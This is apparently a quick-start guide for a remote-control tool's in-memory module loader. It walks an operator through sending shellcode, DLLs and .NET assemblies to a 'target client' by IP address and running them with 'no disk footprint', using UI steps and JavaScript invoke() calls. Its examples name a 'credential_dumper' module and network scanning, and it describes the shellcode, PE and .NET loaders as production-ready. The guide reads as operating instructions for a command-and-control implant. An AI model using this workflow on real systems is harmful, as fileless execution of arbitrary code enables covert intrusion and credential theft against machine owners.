# Quick Start Guide: Reflective Module Loading

This guide will help you get started with the in-memory reflective module loading feature in under 5 minutes.

## What is Reflective Module Loading?

Reflective module loading allows you to dynamically load and execute custom code on the client without writing files to disk. Think of it as sending a program over the network and running it entirely in memory.

**Benefits:**
- No disk footprint (completely in-memory)
- Extend client capabilities on-demand
- Encrypted transfer
- Clean cleanup when done

## Supported Module Types

1. **Shellcode** (.bin files) - Ready to use ✅
2. **PE/DLL** (.dll/.exe files) - Ready to use ✅
3. **.NET Assembly** (.dll/.exe files) - Ready to use ✅

**All module types are production-ready with full UI support!**

## Using the Module Manager UI (Recommended)

The easiest way to work with modules is through the built-in UI.

### Step 1: Access Module Manager

1. Connect to your target client
2. Navigate to the **Module Manager** tab
3. You'll see three panels:
   - **Loaded Modules** (left)
   - **Module Details** (center)
   - **Execution History** (right)

### Step 2: Load a Module

1. Click the **"Load Module"** button (top right)
2. In the dialog:
   - Click **"Browse"** and select your module file
   - Module ID auto-generates (or customize it)
   - Enter a **Module Name**
   - Select **Module Type** (PE, .NET Assembly, or Shellcode)
   - Optionally set **Entry Point** (for PE/.NET modules)
   - Add a **Description**
3. Click **"Load Module"**

The module appears in the Loaded Modules list.

### Step 3: Execute the Module

1. Click on the loaded module in the list
2. Click **"Execute Module"**
3. In the execute dialog:
   - Enter **Arguments** (space-separated)
   - Set **Timeout** in seconds
4. Click **"Execute"**

### Step 4: View Results

Results appear immediately in the **Execution History** panel:
- ✅ Green checkmark = Success
- ❌ Red X = Failed
- View output text
- See exit codes and errors

## Quick Example: Running Shellcode via UI

### Step 1: Prepare Your Module

Create or obtain a shellcode binary. For testing, you can use a simple "hello world" shellcode:

```bash
# Your shellcode binary
example_shellcode.bin
```

### Step 2: Load the Module

Use the Tauri API from the server UI:

```javascript
// Read the shellcode file
const shellcodeData = await invoke('read_module_file', {
  filePath: 'C:\\path\\to\\example_shellcode.bin'
});

// Load it into the client's memory
await invoke('load_module', {
  addr: '192.168.1.100:12345',  // Target client address
  moduleId: 'test_shellcode',
  moduleName: 'Test Shellcode',
  moduleType: 'Shellcode',
  moduleData: shellcodeData,
  entryPoint: null,
  description: 'Simple test shellcode'
});
```

### Step 3: Execute the Module

```javascript
// Execute the loaded module
await invoke('execute_module', {
  addr: '192.168.1.100:12345',
  moduleId: 'test_shellcode',
  args: [],  // No arguments for shellcode
  timeout: 30  // 30 second timeout
});
```

### Step 4: Get Results

Listen for execution results:

```javascript
// Listen for module execution results
listen('module-execution-result', (event) => {
  console.log('Module:', event.payload.module_id);
  console.log('Success:', event.payload.success);
  console.log('Output:', event.payload.output);
  console.log('Exit Code:', event.payload.exit_code);
  
  if (!event.payload.success) {
    console.error('Error:', event.payload.error);
  }
});
```

### Step 5: Clean Up

```javascript
// Unload the module when done
await invoke('unload_module', {
  addr: '192.168.1.100:12345',
  moduleId: 'test_shellcode'
});
```

## Example: Using the Provided Modules

### SystemInfo.cs (.NET Assembly)

```javascript
// 1. Build the example (on Windows)
// cd examples/modules
// csc /target:exe /out:SystemInfo.exe SystemInfo.cs

// 2. Load the module
const moduleData = await invoke('read_module_file', {
  filePath: 'C:\\examples\\modules\\SystemInfo.exe'
});

await invoke('load_module', {
  addr: clientAddress,
  moduleId: 'sysinfo_v1',
  moduleName: 'System Information',
  moduleType: 'DotNetAssembly',
  moduleData: moduleData,
  entryPoint: 'Main',
  description: 'Gather system information'
});

// 3. Execute with arguments
await invoke('execute_module', {
  addr: clientAddress,
  moduleId: 'sysinfo_v1',
  args: ['--detailed'],
  timeout: 60
});
```

### SimpleModule.dll (PE/DLL)

```javascript
// 1. Build the example (on Windows with Visual Studio)
// cd examples/modules
// cl /LD /MD /Fe:SimpleModule.dll SimpleModule.c user32.lib

// 2. Load and execute
const dllData = await invoke('read_module_file', {
  filePath: 'C:\\examples\\modules\\SimpleModule.dll'
});

await invoke('load_module', {
  addr: clientAddress,
  moduleId: 'simple_demo',
  moduleName: 'Simple Demo',
  moduleType: 'PE',
  moduleData: dllData,
  entryPoint: 'Execute',
  description: 'Simple demonstration module'
});

await invoke('execute_module', {
  addr: clientAddress,
  moduleId: 'simple_demo',
  args: ['arg1', 'arg2', 'arg3'],
  timeout: 30
});
```

## Building Example Modules

On a Windows system with Visual Studio and .NET Framework:

```batch
cd examples\modules
build_examples.bat
```

This will create:
- `SystemInfo.exe` - .NET assembly
- `SimpleModule.dll` - Native DLL
- `SimpleModuleExe.exe` - Native EXE

## Common Operations

### List Loaded Modules

```javascript
await invoke('list_modules', {
  addr: clientAddress
});
```

### Execute Same Module Multiple Times

```javascript
// Load once
await invoke('load_module', { /* ... */ });

// Execute multiple times with different args
await invoke('execute_module', { moduleId: 'my_module', args: ['scan'] });
await invoke('execute_module', { moduleId: 'my_module', args: ['dump'] });
await invoke('execute_module', { moduleId: 'my_module', args: ['clean'] });

// Unload when completely done
await invoke('unload_module', { moduleId: 'my_module' });
```

### Error Handling

```javascript
try {
  await invoke('execute_module', {
    addr: clientAddress,
    moduleId: 'my_module',
    args: [],
    timeout: 30
  });
} catch (error) {
  console.error('Failed to execute module:', error);
}

// Listen for execution errors
listen('module-execution-result', (event) => {
  if (!event.payload.success) {
    console.error('Module failed:', event.payload.error);
  }
});
```

## Tips and Best Practices

### 1. Module IDs
Use descriptive, unique IDs:
```javascript
// Good
moduleId: 'credential_dumper_v2.1'
moduleId: 'network_scanner_20240125'

// Avoid
moduleId: 'mod1'
moduleId: 'test'
```

### 2. Timeouts
Set appropriate timeouts based on expected execution time:
```javascript
// Quick operations
timeout: 10

// Network scans
timeout: 120

// Long-running tasks
timeout: 300
```

### 3. Cleanup
Always unload modules when finished:
```javascript
// Load
await invoke('load_module', { /* ... */ });

try {
  // Execute
  await invoke('execute_module', { /* ... */ });
} finally {
  // Always cleanup
  await invoke('unload_module', { moduleId: 'my_module' });
}
```

### 4. Testing
Test modules in isolated environments first:
```javascript
// Test in VM before production use
if (isTestEnvironment) {
  await invoke('execute_module', { /* ... */ });
}
```

### 5. Logging
Keep track of module operations:
```javascript
console.log(`Loading module: ${moduleName}`);
await invoke('load_module', { /* ... */ });

console.log(`Executing module: ${moduleName}`);
await invoke('execute_module', { /* ... */ });

console.log(`Unloading module: ${moduleName}`);
await invoke('unload_module', { /* ... */ });
```

## Troubleshooting

### Module Won't Load
- Check module file path is correct
- Verify module data is not empty
- Ensure module type is correct

### Module Won't Execute
- Verify module is loaded first
- Check module_id matches loaded module
- Ensure client is connected

### No Results
- Check 'module-execution-result' event listener is registered
- Verify timeout is sufficient
- Check client logs for errors

### Module Fails to Execute
- Review module code for errors
- Check arguments format
- Verify module is compatible with client architecture

## Security Reminders

⚠️ **Important:**
- Only load modules from trusted sources
- Test modules in isolated environments first
- Modules execute with client privileges
- Clean up modules after use
- Monitor module execution results

## Next Steps

1. **Read Full Documentation:** See `MODULE_LOADING.md` for complete API reference
2. **Build Examples:** Compile the example modules in `examples/modules/`
3. **Write Your Own:** Create custom modules for your needs
4. **Explore Advanced Features:** Learn about timeouts, error handling, and more

## Support

For questions or issues:
1. Check `MODULE_LOADING.md` for detailed documentation
2. Review `IMPLEMENTATION_SUMMARY.md` for technical details
3. Look at example modules in `examples/modules/`
4. Create an issue on GitHub

## Current Status

**Production Ready - All Phases Complete:**
- ✅ Phase 1: Core Infrastructure
- ✅ Phase 2: PE Reflective Loader
- ✅ Phase 3: .NET Assembly Loader
- ✅ Phase 4: Security & Testing
- ✅ Phase 5: UI & Documentation

**All Module Types:**
- ✅ PE/DLL loader - Fully implemented
- ✅ .NET assembly loader - Complete CLR hosting
- ✅ Shellcode loader - Fully functional

**UI & Documentation:**
- ✅ Module Manager UI - Full-featured interface
- ✅ Comprehensive tutorials (MODULE_TUTORIALS.md)
- ✅ Complete API reference (MODULE_LOADING.md)
- ✅ Security framework with validation

**Security Features (Phase 4):**
- ✅ SHA-256 module hash calculation
- ✅ Module integrity verification
- ✅ Security policy framework
- ✅ Size limit enforcement (50MB default)
- ✅ Argument sanitization
- ✅ Timeout enforcement
- ✅ PE file validation
- ✅ Secure memory allocation

**UI Features (Phase 5):**
- ✅ Module upload dialog with file browser
- ✅ Loaded modules list with details
- ✅ Module execution interface
- ✅ Real-time execution history
- ✅ Visual status indicators
- ✅ Module type icons (PE/.NET/Shellcode)
- ✅ Auto-generated module IDs
- ✅ Responsive three-panel layout

**Documentation:**
- ✅ Step-by-step tutorials for all module types
- ✅ Best practices and workflows
- ✅ Troubleshooting guide
- ✅ API reference
- ✅ Example modules with source code

## Next Steps

1. **Try the Module Manager UI** - Easiest way to get started
2. **Read tutorials** - See MODULE_TUTORIALS.md for detailed guides
3. **Build example modules** - Check examples/modules/ directory
4. **Explore advanced features** - Review MODULE_LOADING.md

See `IMPLEMENTATION_SUMMARY.md` for complete technical details.

## Additional Resources

- **UI Tutorial:** Use the built-in Module Manager (recommended)
- **API Documentation:** MODULE_LOADING.md
- **Step-by-step Tutorials:** MODULE_TUTORIALS.md  
- **Example Modules:** examples/modules/
- **Technical Details:** IMPLEMENTATION_SUMMARY.md
